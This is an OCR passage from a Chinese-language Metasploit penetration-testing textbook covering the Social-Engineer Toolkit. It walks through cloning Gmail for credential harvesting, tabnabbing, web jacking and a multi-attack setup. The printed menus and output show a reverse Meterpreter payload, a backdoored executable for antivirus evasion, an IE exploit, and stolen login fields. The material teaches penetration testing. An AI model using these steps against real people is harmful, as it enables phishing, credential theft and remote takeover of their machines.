PARAM:SCC=1
PARAM: SS=1
PARAM:GALX=S3ftXFIwwOE
POSSIBLE USERNAME FIELD FOUND: Email=ihazomgsecurity2390239203
POSSIBLE PASSWORD FIELD FOUND:PasSwd=thisisacomplexp@55wOrd!!!!!
PARAM: rmShown=1
PARAM:SignIn=Sign+in
PARAM:aSts=
[*] WHEN YOU'RE FINISHED,HIT CONTROL-C TO GENERATE A REPORT.
SET使用一个内建目录来标识站点中含有敏感信息的表单字段和参数。使用高亮红色来标
识潜在的用户名和密码参数，这样可以提醒攻击者这些值得注意的敏感信息。
一旦你完成了对目标敏感信息的获取，点击CTRL-C生成一个报告，如图10-3所示，报告
使用XML和HTML格式。
SET所设置的Web服务器是多线程的，它可以处理大量的请求。当大量目标在网页上输入
他们的密码时，SET会自动把这些表单字段信息分开存储，从而生成一个可读的报告。（》
你也可以将获取的敏感信息导出成XML兼容格式，以便为后面导入到其他工具做好准备。
149
---
## Page 177
Metasploit渗透测试指南
Welcome to the Social-Engineer Tootkit Report Generation Tool.Thiseport should contain infomation obtatned during
vaitab
on secunty communityUse thistootforgoodnotevi.
Social Engineering is definedas theprocess of deceiving peoptentogiving away accessor confidential fnformation
We consider soctalengineering to he the greatestrisk to secunity
Report Statistics
d the site.Based on the totainumber of Ovisitors,there wasa total number of1victin
uauyteir-torthe attack.
that successfullyfellforthe attack.
Report FindingsBelow:
图10-3敏感信息获取报告
10.3.4标签页劫持攻击
在一次标签页劫持攻击场景中，目标用户在浏览器中打开多个标签页，在访问我们构造的
恶意网页时，当他点击了其中的一个恶意链接时，网页将展现“页面正在装载，请等待·”
的提示消息，而当目标用户切换标签页时，恶意网页检测到焦点将被转移到另外一个标签页，
并重写当前页面，向目标用户提示“请等待”正在转向目标用户所要访问网站的信息。
实际上，目标用户却被恶意网页劫持到另一个恶意构造的钓鱼标签页面，并相信他正在访
问合法的E-mail应用或业务应用，并被要求进行登录，当他在这个伪装得很像的钓鱼网页中输
入他的敏感信息之后，将会被重定向至合法网站，这样目标用户的敏感信息就会神不知鬼不觉
地被窃取。你可以通过SET的Web攻击向量接口来使用标签页劫持攻击技术。
10.3.5中间人攻击
中间人攻击使用HTTPreferer机制从一个已受控制的网站，或利用跨站脚本漏洞（XSS），
将目标用户的敏感信息传递给攻击者的HTTP服务器。如果你发现了一个跨站脚本漏洞，然后
发送特殊构造的邪恶URL给目标用户，当目标用户点击该链接后，网页正常运行，但是当目标
用户登录到某个系统时，他的敏感信息将会被传递给攻击者。中间人攻击向量可以在SET的
Web攻击向量接口中找到。
150
---
## Page 178
第10章社会工程学工具包
10.3.6网页劫持
网页劫持攻击是SET0.7版本中的一项新功能，它允许你创建一个克隆的网站，然后通过
一个声称网站已经被转移至其他地方的链接展现给目标用户。当目标用户将鼠标放在该链接的
时候，显示的是正常的URL，而不是攻击者所设定的URL。例如：攻击者克隆的是
https://gmail.com，那么目标用户把鼠标放在该URL上的时候，显示的依然是https://gmail.com，
然而当他点击该URL的时候，Gmail网页迅速被事先设定好的恶意Web服务器所代替。
这种攻击采用了基于时间的框架替换技术，当目标用户把鼠标放在URL上时，其实指向
的是你所要克隆的合法网站。当目标点击URL时，启动框架替换，在目标没有发现的情况下
用恶意克隆网站进行替换。攻击者可以通过修改config/set_config选项来修改Web劫持的启动
时间。
使用该攻击技术来配置SET，需要选择WebJackingAttackMethodO和SiteClonerO，同
时还需要输入你想克隆的网站https://gmail.com③，如下所示：
①6.WebJacking Attack Method
Enter your choice (press enter for default): 6
[!]Website Attack Vectors[!]
@ 2.Site Cloner
Enter number (1-4):2
SET supports both HTTP and HTTPS
Example:http://www.thisisafakesite.com
③ Enter the url to clone: https://gmail.com
[*]Cloning the website:https://gmail.com
[*] This could take a little bit...
Thebest way to use this attackis if username andpasswordform
fields are available.Regardless,this captures all PoSTs on a website.
[*] I have read the above message. [*]
Press{return}tocontinue.
[*]WebJackingAttackVector isEnabled...Victimneeds toclickthelink.
当目标用户访到克隆网页的时候，他将看到如图10-4所示的链接，注意到左下角的URL
链接显示的是https://gmail.com。
151
---
## Page 179
Metasploit渗透测试指南
3 http:/172.16.32.129
The site https://gmail.com asmoved,click here to go to the new location.
图10-4启动页面和指向克隆网页的链接
当目标用户点击该链接的时候，将会展现在他面前的是如图10-5所示的和Gmail欢迎页面
一模一样的克隆页面。
GMail
图10-5克隆的Gmail欢迎页面
注意到在图10-5上面显示的URL暴露了我们的Web服务器地址，在后续的工作中，你可
以注册一个相似的域名，以避免这个问题的发生。一旦目标用户在相应位置输入了他的用户名
和口令，攻击者便拦截和捕获到目标用户的敏感信息了。
152
---
## Page 180
第10章社会工程学工具包
10.3.7综合多重攻击方法
综合攻击向量允许攻击者把各种单一的攻击方法串联起来，实施一次多重攻击。它允许攻
击者配置组合不同的攻击向量，生成一个超级邪恶的Web页面来实施攻击。当目标用户点击链
接后，它将把攻击者所设定的攻击向量依次对目标进行攻击。多重攻击方式是非常有用的，在
一些情况下，Javaapplet攻击可能不会成功，但是客户端的IE浏览器渗透攻击可能会成功；或
者Java applet和客户端的IE浏览器渗透攻击均不成功，但敏感信息窃取攻击能够成功。
在下面的例子中，攻击者将使用Javaapplet攻击，Metasploit客户端渗透攻击，以及网页劫
持攻击。当目标用户浏览到恶意网页时，他将被吸引点击这个链接，紧接着Javaapplet攻击，
Metasploit客户端渗透攻击以及网页劫持攻击将会轰炸式地连续攻击目标。这里我们将选择IE7
客户端渗透攻击，而目标用户使用IE6浏览器进行浏览，来显示在一种攻击失败的情况下，其
他攻击方法是如何成功的：
1.The Java Applet Attack Method
2.The Metasploit Browser Exploit Method
3.Credential Harvester Attack Method
4.Tabnabbing Attack Method
5.Man Left in the Middle Attack Method
6.Web Jacking Attack Method
① 7.Multi-Attack Web Method
8.Return to the previous menu
Enteryourchoice(pressenterfor default):7
[!]Website Attack Vectors [!]
2.Site Cloner
Enter number (1-4):2
③ Enter the url to clone:https://gmail.com
Select whichattacksyouwant touse:
①1.The Java Applet Attack Method (OFF)
2.The Metasploit Browser ExploitMethod(OFF)
3.Credential Harvester Attack Method (OFF)
4.Tabnabbing Attack Method (OFF)
5.Man Left in the Middle Attack Method(OFF)
6.Web Jacking Attack Method (OFF)
7.Use them all -A.K.A.'Tactical Nuke'
8.I'm finishedand want to proceed withthe attack.
9.Return to main menu.
Enter your choice one at atime(hit 8or enter tolaunch):1
153
---
## Page 181
Metasploit渗透测试指南
Turning the Java Applet Attack Vector to ON
Select which attacks you want to use:
Enteryour choice oneat atime(hit8 or enter tolaunch):2
Turning the Metasploit Client Side Attack Vector toON
Option added. Press {return} to add or prepare your next attack.
Selectwhichattacksyouwanttouse:
Enteryour choice one ata time(hit 8 or enter to launch):6
Turning the Web Jacking Attack Vector to ON
Select which attacks you want to use:
...SNIP.··
Enter your choice one at a time (hit 8or enter tolaunch):
开始配置攻击方式，在主菜单选择Multi-AttackWebMethodO，之后选择SiteCloner?，
并输入想要克隆的网站URL：https://gmail.com③；然后，SET列出几种不同攻击方式的菜单：
选择Javaapplet攻击、Metasploit客户端渗透攻击，以及网页劫持攻击方法。你也可
以选择选项7——Use them all-A.K.A.Tactical Nuke'，将自动使用所有的攻击向量进行攻击。
接下来，查看选项都已经配置完成，Java applet攻击、Metasploit客户端渗透攻击、网页
劫持攻击，以及敏感信息获取攻击都已经开启，最后确定并输入enter键或者选择8（一切就
绪)：
Enter your choice one at a time (hit 8 or enter to launch):
What payload do you want to generate:
Name:
Description:
0 2. Windows Reverse_TCP Meterpreter
Spawnameterpretershellonvictimandsend
backtoattacker.
Enter choice (hit enter for default):
Below is a list of encodings to try and bypass AV.
Select one of the below，'backdoored executable' is typically the best.
9 16.Backdoored Executable (BEST)
154
---
## Page 182
第10章社会工程学工具包
Enter your choice(enter for default):
[-]Enter the PoRT of the listener (enter for default):
[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
S  e       o  []
********************************************************
Do you want to create a Linux/osx reverse_tcp payload
in the Java Applet attack as well?
***********************************
Enter choiceyesor no:no
Enter the browser exploit you would like to use
①8.Internet Explorer 7Uninitialized Memory Corruption(MSog-002)
Enter your choice (1-12)(enter for default):8
[*]Cloning the website:https://gmail.com
[*]This couldtakealittlebit...
[*]Injecting Java Applet attackintothenewlycloned website.
[*] Filename obfuscation complete. Payload name is: x5sKAzS
[*] Malicious java applet website prepped for deployment
[*]Injecting iframes into cloned website for MSF Attack....
[*] Malicious iframe injection successful...crafting payload.
resource(src/program_junk/meta_config)>exploit-j
[*]Exploit running as background job.
msf exploit(ms09_o02_memory_corruption)>
[*]Started reverse handler on 172.16.32.129:443
[*] Using URL: http://0.0.0.0:8080/
[*]Local IP:http://172.16.32.129:8080/
[*]Server started.
为了完成所有攻击步骤的建立，还需要选择默认的Meterpreter反弹式攻击载荷O，以及默
认的编码和监听端口9。不要配置Linux和OSX的攻击载荷?，选择浏览器渗透攻击的漏洞版
本是 Internet Explorer7UninitializedMemory Corruption(MS09-002)O，之后 SET将发起攻击。
一旦攻击开始运行，你可以查看克隆网页的情况，一个URL信息会提示你浏览的网页已经
移动到其他地方。图10-4显示了目标用户在他的浏览器中所查看到的信息。
点击该链接后，Metasploit攻击就会运行，下面是后台的一些处理情况：
[*]Sending Internet Explorer 7 CFunctionPointer Uninitialized Memory
Corruption to 172.16.32.131:1329...
这次渗透攻击失败了，因为我们使用的是IE6版本的浏览器，这时目标用户在他屏幕上会
看到如图10-6所示的信息。
155
---
## Page 183
Metasploit渗透测试指南
M
GMail
图10-6多重攻击的安全警示消息
我们还有备用的攻击方案，目标点击运行了恶意的Java applet，一个Meterpretershell开始
运行，同时目标浏览器被重定向到正常的Gmail网页，这次攻击成功了。
注意到使用Javaapplet时，我们会自动把Meterpreter线程迁移到notepad.exe中，这样，即
便目标用户关闭了浏览器，我们也不会因为进程的关闭而终止Meterpreter shell。同时，攻击者
以让Javaapplet警示框不停地弹出，这样可以让目标更加容易选择点击运行键。
在渗透攻击成功之后，Meterpretershell将反弹回连并展现在我们面前，如下所示：
[*] Sending stage (748544 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.129:443 -> 172.16.32.131:1333) at
Thu Sep 09 12:33:20 -0400 2010
[*]Session ID 1(172.16.32.129:443 -> 172.16.32.131:1333) processing
InitialAutoRunScript 'migrate -f'
[*]Current server process:java.exe (824)
[*]Spawning a notepad.exe host process...
[*]Migrating into process ID 3044
[*] New server process: notepad.exe (3044)
msf exploit(ms09_002_memory_corruption）>
现在，我们设想如果渗透攻击失败，而且目标用户对Javaapplet警示框点击取消键（没有
配置重复弹出选项）。目标用户将可能会在指定区域中输入他的用户名和密码。这使得我们可
156
---
## Page 184
第10章社会工程学工具包
以成功的获取到目标的敏感信息，从而仍然有所收获。由于目标没有点击运行Javaapplet，这
导致了我们将不会拥有一个Meterpretershell，但依然可以截取到用户的敏感信息。
[*]WE GOT A HIT!Printing the output:
POSSIBLE USERNAME FIELD FOUND:Email=thisismyuSername
POSSIBLE PASSWORD FIELD FOUND:PasSwd=thisismypasSword
[*”WHEN YOU'RE FINISHED,HIT CONTROL-C TO GENERATE A REPORT.
正如你在前面的例子中所看到的那样，SET工具包中提供了大量且功能强大的Web攻击工
具。尽管有些时候很难说服目标相信一个克隆网站是合法的，但是大多数即便有安全意识与经
验的用户，也都只会注意他们所不熟悉的网站，同时在浏览网页的时候尽量避免这些有潜在安
全威胁的网站。SET试图通过模仿熟悉的网站来避免用户的这种警惕性，该手段甚至能够欺骗
一些专业的技术人员。
10.4传染性媒体生成器
传染性媒体生成器是一个相对简单的攻击向量，通过这个向量，SET创建一个文件夹，你
可以将其烧制到CD/DVD光盘上，或者存储到USB驱动器上。一旦这些存储媒介被插入到自
标主机上，Autorun.inf这个文件将会被自动加载，并运行autorun.inf文件内指定的任意攻击。
目前，SET支持加载可执行文件（例如：Meterpreter），同时也支持文件格式漏洞渗透攻击（例
如adobe漏洞攻击）。
10.5TeenSyUSBHID攻击向量